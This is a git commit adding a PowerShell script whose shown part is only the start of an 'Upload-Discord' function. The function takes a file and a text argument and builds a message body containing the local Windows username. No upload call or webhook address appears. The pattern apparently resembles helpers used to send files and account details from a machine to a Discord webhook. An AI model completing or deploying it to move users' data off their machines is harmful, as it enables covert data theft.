f3768db5d5ac4bfdc5c219e59b815b180f4c144e
roilnz <129535821+roilnz@users.noreply.github.com>
2023-04-04 16:31:59 +0100

    Create test1andahalf.ps1

---
+++ test1andahalf.ps1
@@ -0,0 +1,16 @@
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
